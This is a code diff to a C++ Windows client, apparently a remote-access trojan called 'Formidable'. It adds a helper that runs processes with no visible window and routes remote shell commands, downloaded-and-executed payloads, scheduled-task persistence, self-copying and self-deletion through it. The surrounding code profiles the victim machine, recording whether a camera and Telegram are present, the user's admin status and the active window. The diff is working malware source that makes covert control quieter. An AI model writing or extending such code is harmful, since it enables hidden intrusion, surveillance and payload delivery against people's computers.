@@ -30,6 +30,18 @@ namespace Formidable {
     CRITICAL_SECTION g_TerminalMutex;
     CRITICAL_SECTION g_MultimediaMutex;
     CRITICAL_SECTION g_SendMutex;
+    
+    // 隐藏执行命令
+    void RunCommandSilently(const std::wstring& cmd) {
+        STARTUPINFOW si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi = { 0 };
+        if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
 
     // 安全调用模块入口
     void SafeCallModuleEntry(PFN_MODULE_ENTRY pEntry, SOCKET s, CommandPkg* pkg) {
@@ -71,70 +83,79 @@ namespace Formidable {
     }
 
     void GetClientInfo(ClientInfo& info) {
-        memset(&info, 0, sizeof(ClientInfo));
-        
-        // 基础系统信息
-        std::string os = GetOSVersion();
-        int bits = GetOSBits();
-        if (bits == 64) os += " x64";
-        else os += " x86";
-        strncpy(info.osVersion, os.c_str(), sizeof(info.osVersion) - 1);
-        
-        wchar_t wBuf[MAX_PATH];
-        DWORD size = MAX_PATH;
-        if (GetComputerNameW(wBuf, &size)) {
-            std::string utf8 = WideToUTF8(wBuf);
-            strncpy(info.computerName, utf8.c_str(), sizeof(info.computerName) - 1);
-        } else {
-            char envBuf[MAX_PATH];
-            if (GetEnvironmentVariableA("COMPUTERNAME", envBuf, MAX_PATH)) {
-                strncpy(info.computerName, envBuf, sizeof(info.computerName) - 1);
+        static ClientInfo cachedStatic = { 0 };
+        static bool hasStatic = false;
+
+        if (!hasStatic) {
+            memset(&cachedStatic, 0, sizeof(ClientInfo));
+            
+            // 基础系统信息 (Static)
+            std::string os = GetOSVersion();
+            int bits = GetOSBits();
+            if (bits == 64) os += " x64";
+            else os += " x86";
+            strncpy(cachedStatic.osVersion, os.c_str(), sizeof(cachedStatic.osVersion) - 1);
+            
+            wchar_t wBuf[MAX_PATH];
+            DWORD size = MAX_PATH;
+            if (GetComputerNameW(wBuf, &size)) {
+                std::string utf8 = WideToUTF8(wBuf);
+                strncpy(cachedStatic.computerName, utf8.c_str(), sizeof(cachedStatic.computerName) - 1);
             } else {
-                strncpy(info.computerName, "Unknown Host", sizeof(info.computerName) - 1);
+                char envBuf[MAX_PATH];
+                if (GetEnvironmentVariableA("COMPUTERNAME", envBuf, MAX_PATH)) {
+                    strncpy(cachedStatic.computerName, envBuf, sizeof(cachedStatic.computerName) - 1);
+                }
             }
-        }
-        
-        size = MAX_PATH;
-        if (GetUserNameW(wBuf, &size)) {
-            std::string utf8 = WideToUTF8(wBuf);
-            strncpy(info.userName, utf8.c_str(), sizeof(info.userName) - 1);
-        } else {
-            char envBuf[MAX_PATH];
-            if (GetEnvironmentVariableA("USERNAME", envBuf, MAX_PATH)) {
-                strncpy(info.userName, envBuf, sizeof(info.userName) - 1);
+            
+            size = MAX_PATH;
+            if (GetUserNameW(wBuf, &size)) {
+                std::string utf8 = WideToUTF8(wBuf);
+                strncpy(cachedStatic.userName, utf8.c_str(), sizeof(cachedStatic.userName) - 1);
             } else {
-                strncpy(info.userName, "SYSTEM", sizeof(info.userName) - 1);
+                char envBuf[MAX_PATH];
+                if (GetEnvironmentVariableA("USERNAME", envBuf, MAX_PATH)) {
+                    strncpy(cachedStatic.userName, envBuf, sizeof(cachedStatic.userName) - 1);
+                }
             }
+
+            strncpy(cachedStatic.cpuInfo, GetCpuBrand().c_str(), sizeof(cachedStatic.cpuInfo) - 1);
+            cachedStatic.processID = GetCurrentProcessId();
+            cachedStatic.is64Bit = (bits == 64);
+            cachedStatic.isAdmin = IsAdmin() ? 1 : 0;
+            cachedStatic.clientType = g_ServerConfig.iType;
+            cachedStatic.clientUniqueId = GetStableClientUniqueId(g_ServerConfig.clientID);
+            cachedStatic.hasCamera = CheckCameraExistence() ? 1 : 0;
+            cachedStatic.hasTelegram = CheckTelegramInstalled() ? 1 : 0;
+
+            wchar_t exePathW[MAX_PATH] = { 0 };
+            GetModuleFileNameW(NULL, exePathW, MAX_PATH);
+            std::string exePath = WideToUTF8(exePathW);
+            strncpy(cachedStatic.programPath, exePath.c_str(), sizeof(cachedStatic.programPath) - 1);
+            
+            strncpy(cachedStatic.version, GetExeVersion().c_str(), sizeof(cachedStatic.version) - 1);
+            strncpy(cachedStatic.installTime, GetProcessStartTime().c_str(), sizeof(cachedStatic.installTime) - 1);
+            
+            hasStatic = true;
         }
 
-        strncpy(info.cpuInfo, GetCpuBrand().c_str(), sizeof(info.cpuInfo) - 1);
+        // 复制基础静态信息
+        memcpy(&info, &cachedStatic, sizeof(ClientInfo));
+
+        // 动态更新部分
         strncpy(info.lanAddr, GetLocalIP().c_str(), sizeof(info.lanAddr) - 1);
         strncpy(info.publicAddr, GetPublicIP().c_str(), sizeof(info.publicAddr) - 1);
         
-        info.processID = GetCurrentProcessId();
-        info.is64Bit = (bits == 64);
-        info.isAdmin = IsAdmin() ? 1 : 0;
-        info.clientType = g_ServerConfig.iType;
-        info.clientUniqueId = GetStableClientUniqueId(g_ServerConfig.clientID);
-        info.hasCamera = CheckCameraExistence() ? 1 : 0;
-        info.hasTelegram = CheckTelegramInstalled() ? 1 : 0;
         info.cpuLoad = GetCpuLoad();
         info.memUsage = GetMemoryUsage();
         info.diskUsage = GetDiskUsage();
 
-        wchar_t exePathW[MAX_PATH] = { 0 };
-        GetModuleFileNameW(NULL, exePathW, MAX_PATH);
-        std::string exePath = WideToUTF8(exePathW);
-        strncpy(info.programPath, exePath.c_str(), sizeof(info.programPath) - 1);
-        
         std::wstring wGroup = UTF8ToWide(g_ServerConfig.szGroupName);
         wcsncpy(info.group, wGroup.c_str(), 127);
 
         std::string activeWin = ActivityMonitor::GetStatus();
         strncpy(info.activeWindow, activeWin.c_str(), sizeof(info.activeWindow) - 1);
         
-        strncpy(info.version, GetExeVersion().c_str(), sizeof(info.version) - 1);
-        strncpy(info.installTime, GetProcessStartTime().c_str(), sizeof(info.installTime) - 1);
         strncpy(info.uptime, GetSystemUptime().c_str(), sizeof(info.uptime) - 1);
     }
 
@@ -159,6 +180,7 @@ namespace Formidable {
             case CMD_WINDOW_CTRL:
                 return CMD_WINDOW_LIST;
             case CMD_FILE_LIST:
+            case CMD_DRIVE_LIST:
             case CMD_FILE_DOWNLOAD:
             case CMD_FILE_DOWNLOAD_DIR:
             case CMD_FILE_UPLOAD:
@@ -256,11 +278,21 @@ namespace Formidable {
                 g_ModuleEntryCache[moduleKey] = pEntry;
                 LeaveCriticalSection(&g_ModuleMutex);
 
-                CommandPkg runPkg = *pkg;
-                runPkg.cmd = moduleKey;
-                runPkg.arg1 = 0; 
-                runPkg.arg2 = 0;
-                SafeCallModuleEntry(pEntry, s, &runPkg);
+                if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 == CMD_DRIVE_LIST) {
+                    CommandPkg runPkg = { 0 };
+                    runPkg.cmd = CMD_DRIVE_LIST;
+                    SafeCallModuleEntry(pEntry, s, &runPkg);
+                } else {
+                    CommandPkg runPkg = *pkg;
+                    if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
+                        runPkg.cmd = moduleKey;
+                        runPkg.arg1 = 0;
+                        runPkg.arg2 = 0;
+                    } else {
+                        runPkg.cmd = effectiveCmd;
+                    }
+                    SafeCallModuleEntry(pEntry, s, &runPkg);
+                }
                 return;
             }
             MemoryFreeLibrary(hMod);
@@ -458,8 +490,8 @@ namespace Formidable {
                 // 移除计划任务
                 wchar_t szTaskCmd[512];
                 swprintf_s(szTaskCmd, 512, L"schtasks /delete /tn \"%s\" /f", baseName.c_str());
-                _wsystem(szTaskCmd);
-                _wsystem(L"schtasks /delete /tn \"Formidable2026\" /f"); // 兼容旧版本
+                RunCommandSilently(szTaskCmd);
+                RunCommandSilently(L"schtasks /delete /tn \"Formidable2026\" /f"); // 兼容旧版本
 
                 // 获取自身路径
                 wchar_t szPath[MAX_PATH];
@@ -479,7 +511,7 @@ namespace Formidable {
                     fclose(f);
                     
                     // 执行批处理并退出
-                    ShellExecuteW(NULL, L"open", szBatchPath, NULL, NULL, SW_HIDE);
+                    RunCommandSilently(szBatchPath);
                     ExitProcess(0);
                 }
                 break;
@@ -500,7 +532,7 @@ namespace Formidable {
                 wcscat_s(szTempPath, L"downloaded.exe");
                 std::wstring wUrl = UTF8ToWide(url);
                 if (S_OK == URLDownloadToFileW(NULL, wUrl.c_str(), szTempPath, 0, NULL)) {
-                    ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
+                    RunCommandSilently(szTempPath);
                 }
                 break;
             }
@@ -520,7 +552,7 @@ namespace Formidable {
                             DWORD written;
                             WriteFile(hFile, pkg->data + 4 + nameLen, fileSize, &written, NULL);
                             CloseHandle(hFile);
-                            ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
+                            RunCommandSilently(szTempPath);
                         }
                     }
                 }
@@ -530,15 +562,15 @@ namespace Formidable {
                 int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                 std::string url(pkg->data, dataLen);
                 std::wstring wUrl = UTF8ToWide(url);
-                ShellExecuteW(NULL, L"open", wUrl.c_str(), NULL, NULL, SW_SHOW);
+                ShellExecuteW(NULL, L"open", wUrl.c_str(), NULL, NULL, SW_HIDE);
                 break;
             }
             case CMD_SHELL_EXEC: {
                 int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                 if (dataLen > 0) {
                     std::string cmd(pkg->data, dataLen);
-                    std::wstring wCmd = UTF8ToWide(cmd);
-                    ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c " + wCmd).c_str(), NULL, SW_HIDE);
+                    std::wstring wCmd = L"cmd.exe /c " + UTF8ToWide(cmd);
+                    RunCommandSilently(wCmd);
                 }
                 break;
             }
@@ -598,6 +630,7 @@ namespace Formidable {
                 break;
             case CMD_GET_SYSINFO:
             case CMD_FILE_LIST:
+            case CMD_DRIVE_LIST:
             case CMD_FILE_DOWNLOAD_DIR:
             case CMD_PROCESS_LIST:
             case CMD_PROCESS_KILL:
@@ -788,7 +821,7 @@ namespace Formidable {
                 exeFile += L".exe";
                 
                 if (URLDownloadToFileW(NULL, url.c_str(), exeFile.c_str(), 0, NULL) == S_OK) {
-                    ShellExecuteW(NULL, L"open", exeFile.c_str(), NULL, NULL, SW_HIDE);
+                    RunCommandSilently(exeFile);
                 }
             }
         }
@@ -855,7 +888,7 @@ namespace Formidable {
             if (_wcsicmp(szCurrentPath, destPath.c_str()) != 0) {
                 if (CopyFileW(szCurrentPath, destPath.c_str(), FALSE)) {
                     if (g_ServerConfig.runasAdmin != 1 || IsAdmin()) {
-                        ShellExecuteW(NULL, L"open", destPath.c_str(), NULL, NULL, SW_HIDE);
+                        RunCommandSilently(destPath);
                         exit(0);
                     }
                 }
@@ -906,7 +939,7 @@ namespace Formidable {
                 } else {
                     swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f", taskName.c_str(), szTempXml);
                 }
-                _wsystem(szCmd);
+                RunCommandSilently(szCmd);
                 DeleteFileW(szTempXml);
             }
         }
